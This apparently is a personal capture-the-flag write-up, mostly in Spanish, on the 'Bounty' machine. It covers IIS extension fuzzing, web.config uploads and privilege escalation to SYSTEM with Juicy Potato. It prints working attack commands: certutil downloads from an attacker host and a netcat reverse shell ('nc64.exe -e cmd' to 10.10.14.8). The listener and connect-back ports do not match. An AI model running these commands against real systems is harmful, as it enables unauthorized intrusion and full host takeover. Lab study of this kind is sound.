---
title: "Microsoft-IIS/7.5 & Juicy Potato"
description: "Microsoft-IIS/7.5 & Juicy Potato"
date: "2025-11-29"
banner:
  src: "../../images/eye.jpg"
  alt: "Really close pic of one eye"
  caption: 'Photo by <a href="https://unsplash.com/@v2osk">v2osk</a> on Unsplash'
categories:
  - "Fuzzing"
  - "Web Server"
  - "tool"
  - "Juicy Potato"
keywords:
  - "Fuzzing"
  - "Web Server"
  - "tool"
  - "Juicy Potato"
---

# Que aprendi de la maquina Bounty

En esta maquina podemos ver varias cosas muy comunes y que a la vez me frustran muchisimo cuando las olvido: 

1. Rabbit Holes
2. Fuzzing de archivos

Tambien aprendemos fragilidades del IIS, como ser el `web.config` y subidas de archivos que permitan la extension `.config`.

It is very similar to a .htaccess file in Apache web server. Uploading a .htaccess file to bypass protections around the uploaded files is a known technique.


## Mal Fuzzing

### `archivo.ext`

Fuzzear mal provoca problemas como perder de vista vias de explotacion, perder tiempo, nos anula la entrada potencial a la victima, y nos provoca un falso negativo, es decir que creemos que no existe modo de aproximacion posible, cuando en realidad no aplicamos bien el concepto de Fuzzear.

No ser detallista a la hora de considerar el OS victima y no hacer una investigacion rapida sobre los archivos que utiliza el sistema segun el lenguaje que usa el sistema, y sumado a una completa subestimacion de la importancia de fuzzear `archivo.ext` durante el testeo, me condujeron a un falso negativo.

### wordlist incorrecta

Otras de las cosas que me gusta subestimar es la propia wordlist. Si bien hay muchas wordlists, hacer una pequenia busqueda de wordlists empezando por su propio nombre puede ser la diferencia entre resolver una maquina o no.

Hay listas genericas para servidores, como la lista con la `common.txt` que descubre el folder del IIS `uploadedfiles`. La lista `raft-large-extensions-lowercase.txt` con la que descubrimos las extensiones, y aqui vemos tambien la importancia de esforzarnos minimamente en elegir nuestra lista de fuzzeo por algunos detalles que menciono a continuacion.

#### wordlist-blabla-lowercase.txt

Si buscamos fuzzear extensiones pero no buscamos validar si el servidor interpreta la misma extension de un modo distinto si es Mayus/Minus, la wordlist `web-extensions-big.txt` no es la indicada, por mas que tenga 66885 lineas y eso nos de una sensacion de infalibilidad.

Entonces, vemos que _"lowercase"_ significa eso, que no habra variantes Mayus/Minus de la misma extension, y si bien puede que no esten todas, puede tambien que esten las suficientes.

Si analizamos desde esta optica, vemos que no hay muchas que sean lower case (minusculas), en realidad solo hay dos, y si queremos apuntar a una mayor covertura, eso nos deja solo una:

```sh
└─$ locate /usr/share/wordlists/SecLists *.txt | grep extension | grep lower  
/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-extensions-lowercase.txt
/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-extensions-lowercase.txt
/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-extensions-lowercase.txt
/usr/share/wordlists/SecLists/Fuzzing/file-extensions-lower-case.txt

└─$ cat /usr/share/wordlists/SecLists/Fuzzing/file-extensions-lower-case.txt | wc -l      
769

└─$ cat /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-extensions-lowercase.txt | wc -l
2367
```

> Las listas mencionadas se encuentran en `SecLists/Discovery/Web-Content/`

### Fuzzing mal aplicado

Si bien podriamos pensar que fuzzear con wffuz `archivo.ext` para buscar vias potenciales de explotacion de un servidor seria una via valida de reconocimiento, si el archivo de extensiones es muy grande se vuelve ineficiente. Y por el tiempo que llevaria llegar a un archivo.ext util quiza cancelemos el proceso antes de llegar a el.

Por ello, seria mejor no pasar por alto el OS del servidor, y fuzzear archivos con una pequenia lista de extensiones basada en el lenguaje que usa su sistema. El comando que podriamos usar para ello seria el siguiente:

```sh
wfuzz -u http://target.vict/FUZZ.FUZ2Z -w wordlist.txt -z list,asp-aspx --hc 404 
```

## Escalation of Privilege with Juicy Potato + Netcat for reverse shell

### Dangerous Privileges

```PS
whoami /priv
```

1. SeImpersonatePrivilege
   1. Juicy Potato 
      1. Alternativas
         1. (En algunos no funcionara, pero hay un modo alternativo con PIPES - pipeserverimpoersonate) (quiza sea el Windows Server 2019)
      2. Fallos
         1. Por default Juicy Potato utiliza un CLSID, pero si falla se pueden utilzar otros segun sea la version del sistema (systeminfo)
      3. Versiones
         1. Windows 2008 es vulnerable al EternalBlue, se podria subir chisel para para hacer un port forwarding exponiendo el puerto 445 y atacarlo

### How-to attack

1. Download Juicy Potato (fresh potatoes > JuicyPotato.exe)
   1. https://ohpe.github.io/juicy-potato/
2. Download Netcat for Windows (v1.12)
   1. https://eternallybored.org/misc/netcat/

```sh
unzip netcat.zip -d netcat
mv netcat/nc64.exe .

# verify
└─$ ls
nc64.exe JuicyPotato.exe

# Create a Python server to share the files with Windows Victim
└─$ python -m http.server 80
# Create a Netcat listener in the Kali Attacker
└─$ nc -lvnp 9191
# Request the files from Windows Victim
PS C:\Windows\Temp\Privesc> certutil.exe -f -urlcache -split http://10.10.14.8/JuicyPotato.exe JuicyPotato.exe
PS C:\Windows\Temp\Privesc> certutil.exe -f -urlcache -split http://10.10.14.8/nc64.exe nc64.exe

# verify
PS C:\Windows\Temp\Privesc> dir
Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---         12/2/2025  11:12 PM     347648 JuicyPotato.exe                   
-a---         12/2/2025  11:12 PM      45272 nc64.exe                          

# Reverse Shell
PS C:\Windows\Temp\Privesc> .\JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 9191 -a "/c C:\Windows\Temp\Privesc\nc64.exe -e cmd 10.10.14.8 9292"

# the Kali Attacker Netcat listener "nc -lvnp 9191"
C:\Windows\system32>whoami
nt authority\system
```